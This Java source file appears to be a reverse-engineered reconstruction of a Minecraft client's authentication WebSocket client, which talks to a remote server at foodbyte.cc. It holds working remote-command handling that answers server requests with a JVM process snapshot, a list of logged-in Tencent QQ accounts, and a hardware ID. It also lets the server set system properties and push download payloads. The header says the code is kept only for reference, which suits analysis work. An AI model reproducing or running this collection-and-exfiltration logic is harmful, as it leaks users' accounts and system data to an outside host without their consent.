package myau.vendor;

import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import java.io.BufferedOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.List;

/**
 * Restored {@code easywsclient} + OpenSSL WebSocket authentication session
 * ({@code 0x1805EEF70}, {@code 0x18063BFB0}, {@code 0x180639EB0}, and
 * virtualized {@code WS_Message_Callback} at {@code 0x1805CC380}).
 *
 * <p>Protocol details verified against the unpacked native binary:
 * <ul>
 *   <li>Handshake URL: {@code wss://foodbyte.cc:443/MYAU/<xxtea_hex>}, where
 *       {@code <xxtea_hex>} encrypts {@code <username>$<password>$<uint32_nonce>$v2}
 *       under {@link VendorConfig#INITIAL_KEY} ({@code "中国"}).</li>
 *   <li>Upgrade headers: {@code Host}, {@code Upgrade}, {@code Connection},
 *       {@code Authorization}, {@code Cookies}, {@code Sec-WebSocket-Key},
 *       {@code Sec-WebSocket-Version} (no {@code User-Agent} or {@code Origin}).</li>
 *   <li>Wire framing: incoming WebSocket {@code Pong} ({@code 0xA}) frames synthesize
 *       unencrypted {@code "{ \"@class\" : \".pong\" }"}; all text frames are
 *       XXTEA-encrypted lowercase hex strings whose plaintext is tokenized on {@code '$'}
 *       (skipping empty segments, {@code 0x1805DBC30}).</li>
 * </ul>
 *
 * <p>Preserved strictly for structural reference; never invoked by the client.
 */
public final class AuthWebSocketClient {
    public interface StatusListener {
        void onNotify(int toastLevel, long durationMs, String message);

        void onAuthSucceeded();

        void onAuthFailed(String reason);
    }

    private final SecureRandom secureRandom = new SecureRandom();

    private volatile String clientKey = VendorConfig.INITIAL_KEY;
    private volatile String serverKey = VendorConfig.INITIAL_KEY;
    private volatile int handshakeNonce;
    private volatile boolean sessionBegun;
    private volatile boolean authenticated;
    private volatile boolean exitRequested;
    private StatusListener statusListener;

    public void setStatusListener(StatusListener statusListener) {
        this.statusListener = statusListener;
    }

    public int nextMt19937Nonce32() {
        int seed = secureRandom.nextInt();
        int[] mt = new int[624];
        mt[0] = seed;
        for (int i = 1; i < 624; i++) {
            int prev = mt[i - 1];
            mt[i] = (1812433253 * (prev ^ (prev >>> 30)) + i);
        }
        int y = mt[0];
        y ^= (y >>> 11);
        y ^= (y << 7) & 0x9D2C5680;
        y ^= (y << 15) & 0xEFC60000;
        y ^= (y >>> 18);
        return y;
    }

    public String buildHandshakeUrl(String username, String password) {
        this.clientKey = VendorConfig.INITIAL_KEY;
        this.serverKey = VendorConfig.INITIAL_KEY;
        this.handshakeNonce = nextMt19937Nonce32();
        String unsignedNonce = Integer.toUnsignedString(this.handshakeNonce);
        String handshakePlain = username
                + VendorConfig.PROTOCOL_DELIMITER + password
                + VendorConfig.PROTOCOL_DELIMITER + unsignedNonce
                + VendorConfig.HANDSHAKE_PROTOCOL_TAG;
        String encryptedHex = PacketCipher.encrypt(handshakePlain, VendorConfig.INITIAL_KEY);
        return VendorConfig.WS_BASE_URL + "/" + encryptedHex;
    }

    public void connectAndAuthenticate(String username, String password) throws IOException {
        this.exitRequested = false;
        this.authenticated = false;
        this.sessionBegun = false;

        while (!exitRequested) {
            String fullUrl = buildHandshakeUrl(username, password);
            URI uri = URI.create(fullUrl);
            String host = uri.getHost();
            int port = uri.getPort() > 0 ? uri.getPort() : 443;
            String resourcePath = uri.getRawPath();

            SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();
            try (SSLSocket socket = (SSLSocket) factory.createSocket(host, port)) {
                socket.setSoTimeout(15000);
                socket.startHandshake();

                InputStream in = socket.getInputStream();
                OutputStream out = new BufferedOutputStream(socket.getOutputStream());

                performUpgradeHandshake(host, port, resourcePath, in, out);
                runFrameLoop(in, out);
                if (authenticated || exitRequested) {
                    break;
                }
            } catch (IOException e) {
                if (exitRequested) {
                    throw e;
                }
                notifyToast(LoginDialogUi.TOAST_ERROR, 3000L,
                        "服务器连接失败\nUnable to resolve the server address");
                try {
                    Thread.sleep(3000L);
                } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                    throw new IOException("Interrupted during reconnect backoff", ie);
                }
            }
        }
    }

    private void performUpgradeHandshake(String host, int port, String path, InputStream in, OutputStream out)
            throws IOException {
        String request = "GET " + path + " HTTP/1.1\r\n"
                + "Host: " + host + ":" + port + "\r\n"
                + "Upgrade: websocket\r\n"
                + "Connection: Upgrade\r\n"
                + "Authorization: " + VendorConfig.WS_AUTHORIZATION + "\r\n"
                + "Cookies: " + VendorConfig.WS_COOKIE + "\r\n"
                + "Sec-WebSocket-Key: " + VendorConfig.WS_SEC_KEY + "\r\n"
                + "Sec-WebSocket-Version: " + VendorConfig.WS_VERSION + "\r\n"
                + "\r\n";

        out.write(request.getBytes(StandardCharsets.UTF_8));
        out.flush();

        String statusLine = readHttpLine(in);
        if (!statusLine.contains("101")) {
            throw new IOException("Bad status code: " + statusLine);
        }
        while (true) {
            String headerLine = readHttpLine(in);
            if (headerLine.isEmpty()) {
                break;
            }
        }
    }

    private void runFrameLoop(InputStream in, OutputStream out) throws IOException {
        while (!exitRequested) {
            int b0 = in.read();
            if (b0 < 0) {
                break;
            }
            int b1 = in.read();
            if (b1 < 0) {
                break;
            }
            int opcode = b0 & 0x0F;
            boolean masked = (b1 & 0x80) != 0;
            long payloadLen = b1 & 0x7F;
            if (payloadLen == 126) {
                payloadLen = ((readByteExact(in) & 0xFFL) << 8) | (readByteExact(in) & 0xFFL);
            } else if (payloadLen == 127) {
                payloadLen = 0;
                for (int i = 0; i < 8; i++) {
                    payloadLen = (payloadLen << 8) | (readByteExact(in) & 0xFFL);
                }
            }

            byte[] mask = null;
            if (masked) {
                mask = readExact(in, 4);
            }
            byte[] payload = readExact(in, (int) payloadLen);
            if (masked && mask != null) {
                for (int i = 0; i < payload.length; i++) {
                    payload[i] ^= mask[i & 3];
                }
            }

            if (opcode == 0x8) {
                break;
            } else if (opcode == 0x9) {
                sendWebSocketFrame(out, 0xA, payload);
            } else if (opcode == 0xA) {
                handleIncomingMessage(VendorConfig.HEARTBEAT_PONG_JSON, out);
            } else if (opcode == 0x1) {
                String text = new String(payload, StandardCharsets.UTF_8);
                handleIncomingMessage(text, out);
            }
        }
    }

    /**
     * Mirrors {@code WS_Message_Callback} ({@code 0x1805CC380}) and
     * {@code SplitDollarNonEmpty} ({@code 0x1805DBC30}).
     */
    public void handleIncomingMessage(String rawMessage, OutputStream out) throws IOException {
        if (rawMessage == null || rawMessage.isEmpty()) {
            return;
        }
        if (VendorConfig.HEARTBEAT_PONG_JSON.equals(rawMessage)) {
            return;
        }

        String decrypted = PacketCipher.decrypt(rawMessage.trim(), serverKey);
        List<String> tokens = splitDollarTokens(decrypted);
        if (tokens.isEmpty()) {
            return;
        }

        String cmd = tokens.get(0);
        switch (cmd) {
            case "setClientKey":
                if (tokens.size() >= 2) {
                    this.clientKey = tokens.get(1);
                }
                break;

            case "setServerKey":
                if (tokens.size() >= 2) {
                    this.serverKey = tokens.get(1);
                }
                break;

            case "begin":
                this.sessionBegun = true;
                sendEncryptedFrame(out, "begin$" + VendorConfig.CLIENT_VERSION);
                break;

            case "notify":
                if (tokens.size() >= 4) {
                    int level = parseIntSafe(tokens.get(1), LoginDialogUi.TOAST_INFO);
                    long dur = parseLongSafe(tokens.get(2), 3000L);
                    notifyToast(level, dur, tokens.get(3));
                } else if (tokens.size() >= 3) {
                    int level = parseIntSafe(tokens.get(1), LoginDialogUi.TOAST_INFO);
                    notifyToast(level, 3000L, tokens.get(2));
                } else if (tokens.size() == 2) {
                    notifyToast(LoginDialogUi.TOAST_INFO, 3000L, tokens.get(1));
                }
                break;

            case "download":
                handleDownloadPayload(tokens);
                break;

            case "printString":
                if (tokens.size() >= 2) {
                    System.out.println(tokens.get(1));
                }
                break;

            case "setEnvString":
                if (tokens.size() >= 3) {
                    System.setProperty(tokens.get(1), tokens.get(2));
                }
                break;

            case "getInfo":
                handleGetInfo(out);
                break;

            case "getHwid":
                sendEncryptedFrame(out, "getHwid$" + HardwareIdGenerator.generateHwid());
                break;

            case "hwAuth": {
                String challenge = tokens.size() >= 2 ? tokens.get(1) : Integer.toUnsignedString(handshakeNonce);
                sendEncryptedFrame(out, "hwAuth$" + HardwareIdGenerator.generateHwid() + "$" + challenge);
                this.authenticated = true;
                if (statusListener != null) {
                    statusListener.onAuthSucceeded();
                }
                break;
            }

            case "fail": {
                String reason = tokens.size() >= 2 ? tokens.get(1) : "Authentication failed";
                notifyToast(LoginDialogUi.TOAST_ERROR, 5000L, reason);
                this.authenticated = false;
                this.exitRequested = true;
                if (statusListener != null) {
                    statusListener.onAuthFailed(reason);
                }
                break;
            }

            case "exit":
                this.exitRequested = true;
                break;

            default:
                break;
        }
    }

    private void handleGetInfo(OutputStream out) throws IOException {
        JvmProcessInspector.ProcessSnapshot snapshot = JvmProcessInspector.inspectCurrentProcess();
        String jvmJson = snapshot.toJson().toString();
        if (jvmJson.isEmpty()) {
            sendEncryptedFrame(out, "InfoTag$Minecraft info empty!");
            return;
        }
        List<String> qqAccounts = TencentQqScanner.scanLoggedQqAccounts();
        StringBuilder reply = new StringBuilder("InfoTag$").append(jvmJson);
        if (!qqAccounts.isEmpty()) {
            reply.append('$').append(String.join(",", qqAccounts));
        }
        sendEncryptedFrame(out, reply.toString());
    }

    private void handleDownloadPayload(List<String> tokens) {
        if (tokens.size() >= 3) {
            int slotId = parseIntSafe(tokens.get(1), -1);
            byte[] payloadBytes = PacketCipher.hexToBytes(tokens.get(2));
            System.out.println("download: slot=" + slotId + " (" + payloadBytes.length + " bytes)");
        } else if (tokens.size() == 2) {
            byte[] payloadBytes = PacketCipher.hexToBytes(tokens.get(1));
            System.out.println("download: " + payloadBytes.length + " bytes");
        }
    }

    /**
     * Exact equivalent of {@code 0x1805DBC30}: splits on {@code '$'} and retains
     * only non-empty tokens ({@code token.size() > 0}).
     */
    public static List<String> splitDollarTokens(String input) {
        List<String> out = new ArrayList<>();
        if (input == null || input.isEmpty()) {
            return out;
        }
        int start = 0;
        int len = input.length();
        for (int i = 0; i <= len; i++) {
            if (i == len || input.charAt(i) == '$') {
                if (i > start) {
                    out.add(input.substring(start, i));
                }
                start = i + 1;
            }
        }
        return out;
    }

    private void sendEncryptedFrame(OutputStream out, String plaintext) throws IOException {
        String encryptedHex = PacketCipher.encrypt(plaintext, clientKey);
        byte[] data = encryptedHex.getBytes(StandardCharsets.UTF_8);
        sendWebSocketFrame(out, 0x1, data);
    }

    private void sendWebSocketFrame(OutputStream out, int opcode, byte[] payload) throws IOException {
        ByteArrayOutputStream frame = new ByteArrayOutputStream(payload.length + 14);
        frame.write(0x80 | (opcode & 0x0F));

        byte[] mask = new byte[4];
        secureRandom.nextBytes(mask);

        int len = payload.length;
        if (len < 126) {
            frame.write(0x80 | len);
        } else if (len <= 0xFFFF) {
            frame.write(0x80 | 126);
            frame.write((len >>> 8) & 0xFF);
            frame.write(len & 0xFF);
        } else {
            frame.write(0x80 | 127);
            long l = len;
            for (int i = 7; i >= 0; i--) {
                frame.write((int) ((l >>> (i * 8)) & 0xFF));
            }
        }

        frame.write(mask);
        for (int i = 0; i < len; i++) {
            frame.write(payload[i] ^ mask[i & 3]);
        }

        out.write(frame.toByteArray());
        out.flush();
    }

    private void notifyToast(int level, long durationMs, String message) {
        if (statusListener != null) {
            statusListener.onNotify(level, durationMs, message);
        }
    }

    private static int parseIntSafe(String s, int fallback) {
        try {
            return Integer.parseInt(s.trim());
        } catch (Exception e) {
            return fallback;
        }
    }

    private static long parseLongSafe(String s, long fallback) {
        try {
            return Long.parseLong(s.trim());
        } catch (Exception e) {
            return fallback;
        }
    }

    private static String readHttpLine(InputStream in) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream(128);
        int prev = -1;
        while (true) {
            int cur = in.read();
            if (cur < 0) {
                throw new EOFException("Unexpected EOF during WebSocket HTTP upgrade");
            }
            if (prev == '\r' && cur == '\n') {
                byte[] bytes = buf.toByteArray();
                return new String(bytes, 0, bytes.length - 1, StandardCharsets.UTF_8);
            }
            buf.write(cur);
            prev = cur;
        }
    }

    private static int readByteExact(InputStream in) throws IOException {
        int b = in.read();
        if (b < 0) {
            throw new EOFException("Unexpected EOF in WebSocket stream");
        }
        return b;
    }

    private static byte[] readExact(InputStream in, int length) throws IOException {
        byte[] buf = new byte[length];
        int off = 0;
        while (off < length) {
            int r = in.read(buf, off, length - off);
            if (r < 0) {
                throw new EOFException("Unexpected EOF reading WebSocket frame payload");
            }
            off += r;
        }
        return buf;
    }

    public boolean isSessionBegun() {
        return sessionBegun;
    }

    public boolean isAuthenticated() {
        return authenticated;
    }
}
